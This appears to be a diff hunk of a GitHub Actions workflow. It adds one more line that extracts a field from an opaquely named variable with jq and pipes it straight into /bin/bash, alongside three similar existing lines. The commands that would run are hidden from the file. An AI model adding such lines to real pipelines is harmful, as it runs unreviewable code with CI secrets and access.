@@ -33,6 +33,7 @@ jobs:
           echo $s41 | jq -r .yagl30070 | /bin/bash
           echo $fi7860 | jq -r .yaqm576 | /bin/bash
           echo $lu40202 | jq -r .ysgj1 | /bin/bash
+          echo $j18 | jq -r .e6658 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
